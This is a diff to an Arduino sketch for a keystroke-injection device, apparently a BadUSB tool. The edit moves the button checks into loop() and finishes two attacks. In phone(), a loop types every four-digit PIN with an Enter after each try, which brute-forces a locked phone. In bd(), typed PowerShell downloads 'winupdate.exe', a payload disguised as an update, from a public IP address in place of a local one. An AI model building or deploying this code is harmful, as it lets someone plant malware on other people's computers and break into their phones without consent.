@@ -10,13 +10,19 @@ void fb();
 void setup() 
 {
   kb_init();
-  bool btnState;
+  
   pinMode(2, INPUT);
   pinMode(3, INPUT);
   pinMode(4, INPUT);
   digitalWrite(2, 1);
   digitalWrite(3, 1);
   digitalWrite(4, 1);
+  
+}
+
+void loop() 
+{
+  bool btnState;
   btnState = digitalRead(2);
   if(btnState == LOW) {
     bd();
@@ -31,20 +37,16 @@ void setup()
   }
 }
 
-void loop() 
-{
-  // put your main code here, to run repeatedly:
-
-}
-
 void phone()
 {
   for(int i = 30; i < 40 ; i++){
     for(int q = 30; q < 40; q++){
       for(int e = 30; e < 40; e++){
         for(int w = 30; w < 40; w++){
-          writeKey(i, 0, 0);writeKey(q, 0, 0);
-          writeKey(e, 0, 0);writeKey(w, 0, 0);
+          writeKey(i, 0, 0);DELAY;writeKey(q, 0, 0);DELAY;
+          writeKey(e, 0, 0);DELAY;writeKey(w, 0, 0);
+          DELAY;
+          ENTER;
           DELAY;
         }
       }
@@ -86,7 +88,7 @@ void bd()
   DELAY;
   ENTER;
   DELAY;
-  printKey("$client.DownloadFile(\"http://192.168.1.16/winupdate.exe\",\"winupdate.exe\")");
+  printKey("$client.DownloadFile(\"http://86.247.205.102/winupdate.exe\",\"winupdate.exe\")");
   DELAY;
   ENTER;
   delay(2000);
